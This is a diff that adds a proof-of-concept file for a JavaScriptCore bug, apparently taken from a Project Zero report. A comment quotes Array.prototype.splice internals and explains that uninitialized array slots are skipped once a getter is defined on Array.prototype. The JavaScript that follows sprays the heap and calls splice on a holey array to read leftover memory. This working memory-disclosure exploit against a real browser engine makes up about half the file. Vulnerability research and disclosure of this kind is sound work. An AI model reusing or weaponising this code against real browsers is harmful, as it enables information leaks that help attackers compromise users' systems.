@@ -1,0 +1,44 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1218&desc=2
+
+Here's a snippet of arrayProtoFuncSplice.
+
+EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec)
+{
+    ...
+            result = JSArray::tryCreateForInitializationPrivate(vm, exec->lexicalGlobalObject()->arrayStructureForIndexingTypeDuringAllocation(ArrayWithUndecided), actualDeleteCount);
+            if (!result)
+                return JSValue::encode(throwOutOfMemoryError(exec, scope));
+            
+            for (unsigned k = 0; k < actualDeleteCount; ++k) {
+                JSValue v = getProperty(exec, thisObj, k + actualStart);
+                RETURN_IF_EXCEPTION(scope, encodedJSValue());
+                if (UNLIKELY(!v)) {
+                    continue;
+                }
+                result->initializeIndex(vm, k, v);
+            }
+    ...
+}
+
+|JSArray::tryCreateForInitializationPrivate| will return an uninitialized JSArray. So the next routine must clear its all indices. But the routine skips holes in |thisObj|. This is fine under normal circumstances because the type of |result| will be ArrayWithUndecided, unless you're having a bad time. We can force |result|'s type to ArrayWithSlowPutArrayStorage by using |JSGlobalObject::haveABadTime|.
+
+PoC:
+-->
+
+function gc() {
+    for (let i = 0; i < 0x10; i++)
+        new ArrayBuffer(0x1000000);
+}
+
+Array.prototype.__defineGetter__(0x1000, () => 1);
+
+gc();
+
+for (let i = 0; i < 0x100; i++) {
+    new Array(0x100).fill(1234.5678);
+}
+
+gc();
+
+print(new Array(0x100).splice(0));
